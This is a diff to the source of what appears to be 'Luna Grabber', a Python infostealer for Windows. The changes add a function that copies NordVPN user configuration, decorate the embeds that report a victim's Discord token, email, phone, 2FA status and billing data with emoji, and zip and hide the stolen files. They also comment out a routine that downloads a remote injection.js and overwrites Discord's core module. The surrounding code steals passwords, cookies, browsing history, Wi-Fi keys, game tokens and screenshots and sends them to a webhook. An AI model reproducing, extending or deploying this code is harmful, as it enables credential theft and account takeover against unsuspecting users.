@@ -42,7 +42,7 @@ def main(webhook):
     get_inf()
     grabtokens()
 
-    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi, grabmctokens, epicgamesdata]
+    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi, grabmctokens, epicgamesdata, grabnordvpn]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -75,7 +75,7 @@ def main(webhook):
 def Luna():
     debug()
     main(webhook)
-    inject(webhook)
+    # inject(webhook)
     cleanup()
 
 def try_extract(func):
@@ -87,6 +87,8 @@ def try_extract(func):
         return wrapper
 
 def get_inf():
+    global ip_address, mac_address, hwid, pc_username, pc_name, computer_os, cpu, gpu, ram
+
     ip_address = requests.get('http://ipinfo.io/json').json()['ip']
     mac_address = ':'.join(findall('..', '%012x' % uuid.getnode()))
 
@@ -103,11 +105,12 @@ def get_inf():
     ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                 0].TotalVisibleMemorySize) / 1048576, 0)
 
-    embed.add_field(name="SYSTEM INFO", value=f'''`PC Username:` **{pc_username}**\n`PC Name:` **{pc_name}**\n`OS:` **{computer_os}**\n\n`IP:` **{ip_address}**\n`MAC:` **{mac_address}**\n`HWID:` **{hwid}**`CPU:` **{cpu.Name}**\n`GPU:` **{gpu.Name}**\n`RAM:` **{ram}GB**''', inline=False)
+    embed.add_field(name="SYSTEM INFO", value=f'''💻`PC Username:` **{pc_username}**\n<:computer_2:996126609650225322>`PC Name:` **{pc_name}**\n🌐`OS:` **{computer_os}**\n\n👀`IP:` **{ip_address}**\n🍏`MAC:` **{mac_address}**\n🔧`HWID:` **{hwid}**<:cpu:996126314555768882>`CPU:` **{cpu.Name}**\n<:gpu:996126996952272906>`GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081>`RAM:` **{ram}GB**''', inline=False)
 
 @try_extract
 class grabtokens():
     def __init__(self):
+        global username
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
@@ -244,14 +247,6 @@ class grabtokens():
             email = r.json()['email']
 
             try:
-                if r.json()['bio'] == "":
-                    bio = "No bio was found"
-                else:
-                    bio = r.json()['bio']
-            except KeyError:
-                bio = "No bio was found"
-
-            try:
                 if r.json()['mfa_enabled'] == True:
                     mfa = "✅"
                 if r.json()['mfa_enabled'] == False:
@@ -292,7 +287,7 @@ class grabtokens():
                 all_codes = "❌ No gift codes found"
                 title = ""
 
-            embed.add_field(name="DISCORD INFO", value=f'''`Discord Username:` **{username}** \n`Email:` **{email}**\n`Phone:` **{phone}**\n\n`2FA:` **{mfa}**\n`Nitro:` **{nitro}**\n`Billing:` **{methods}**\n\n`About Me:` ```{bio}```\n`Token:` **{token}**\n\n`{title}:` **{all_codes}**''', inline=False)
+            embed.add_field(name="DISCORD INFO", value=f'''<:1119pepesneakyevil:972703371221954630>`Discord Username:` **{username}** \n<:gmail:996083031632773181>`Email:` **{email}**\n<:mobilephone:996101721879224331>`Phone:` **{phone}**\n\n<:2fa:996102455744012428>`2FA:` **{mfa}**\n<a:nitroboost:996004213354139658>`Nitro:` **{nitro}**\n<:billing:996099943574012024>`Billing:` **{methods}**\n\n<:pepehappy:996100452112400526>`Token:` **{token}**\n\n:gift:`{title}:` **{all_codes}**''', inline=False)
 
 def ss():
     ImageGrab.grab(
@@ -508,7 +503,27 @@ class epicgamesdata():
             with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
                 g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
                 g.write(f"No epic games data was found :(\n{e}")
-            
+                hide(".\\epicgames-data.txt")
+
+@try_extract
+class grabnordvpn():
+     def __init__(self):
+        self.appdata = os.getenv("localappdata")
+
+        try:
+            with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
+                f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
+                f.write("Nord Vpn Data Found:\n")
+
+                nord_path = open((self.appdata + "\\NordVPN\\NordVPN.exe_Path_NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config")).read()
+                f.write(nord_path)
+                hide(".\\nordvpn-data.txt")
+        except Exception as e:
+            with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
+                f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
+                f.write(f"No nord vpn data was found :(\n{e}")
+                hide(".\\nordvpn-data.txt")
+
 @try_extract
 class grabcookies():
     def __init__(self):
@@ -592,6 +607,7 @@ def zipup():
         zipf.write("minecraft-sessioninfo.json")
         zipf.write("minecraft-usercache.json")
         zipf.write("epicgames-data.txt")
+        zipf.write("nordvpn-data.txt")
         zipf.write("desktop-screenshot.png")
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
 
@@ -603,6 +619,7 @@ def cleanup():
                   os.remove("minecraft-usercache.json"),
                   os.remove("minecraft-sessioninfo.json"),
                   os.remove("epicgames-data.txt"),
+                  os.remove("nordvpn-data.txt"),
                   os.remove("desktop-screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
         try:
@@ -613,18 +630,18 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject():
-    appdata = os.getenv("localappdata")
-    for _dir in os.listdir(appdata):
-        if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-                if match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
-                    f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook)
-                    modules_dir = os.listdir(abspath+'\\modules') 
-                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
-                        indexFile.write(f)
-                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+# def inject():
+    # appdata = os.getenv("localappdata")
+    # for _dir in os.listdir(appdata):
+        # if 'discord' in _dir.lower():
+            # for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
+                # if match(r'app-(\d*\.\d*)*', __dir):
+                    # abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
+                    # f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook)
+                    # modules_dir = os.listdir(abspath+'\\modules') 
+                    # with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                        # indexFile.write(f)
+                    # subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 class debug:
     def __init__(self):
